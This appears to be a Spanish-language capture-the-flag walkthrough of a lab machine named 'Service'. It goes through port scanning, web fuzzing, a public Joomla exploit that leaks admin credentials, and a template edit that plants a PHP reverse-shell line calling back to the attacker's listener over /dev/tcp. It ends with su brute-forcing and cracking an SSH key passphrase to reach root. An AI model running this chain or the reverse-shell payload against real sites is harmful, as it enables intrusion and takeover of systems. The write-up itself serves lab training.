# Máquina Service

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.138

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80,139,445 -vvv -Pn 192.168.5.138

![alt text](image-2.png)

### Fuzing web

feroxbuster --url http://192.168.5.138:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![alt text](image-3.png)

encontramos que estamos frente a un joomla

![alt text](image-4.png)

### Explotación

Utilizo la herramienta https://github.com/OWASP/joomscan

perl joomscan.pl -u http://192.168.5.138:8080/ 

![alt text](image-5.png)

Busco un exploit para esa versión o mayor.

![alt text](image-6.png)

la descargo y le cambio la extensión por rb

mv 51334.py 51334.rb

la ejecuto:

ruby 51334.rb http://192.168.5.138:8080

![alt text](image-7.png)

inicio sesión con las credenciales admin:j00mL@123###

![alt text](image-8.png)

me pongo en escucha con netcat en el puerto 443

me dirijo a:

System > Templates > Administrator Templates > Atum Details and Files y editamos el archivo index.php y le agregamos la siguiente linea

system("bash -c 'bash -i >& /dev/tcp/192.168.5.131/443 0>&1'");

![alt text](image-9.png)

![alt text](image-10.png)

### Escalar privilegios

Utilizando la herramienta suForce

![alt text](image-11.png)

encontré la contraseña de root, luego en el directorio root encontré el archivo .joel_key que contenía un id_rsa, copié el id_rsa y usé la herramienta RSAcrack para obtener el passphrase.

![alt text](image-12.png)

me conecté por ssh:

![alt text](image-13.png)


### user.txt

![alt text](image-14.png)

### root.txt

![alt text](image-15.png)
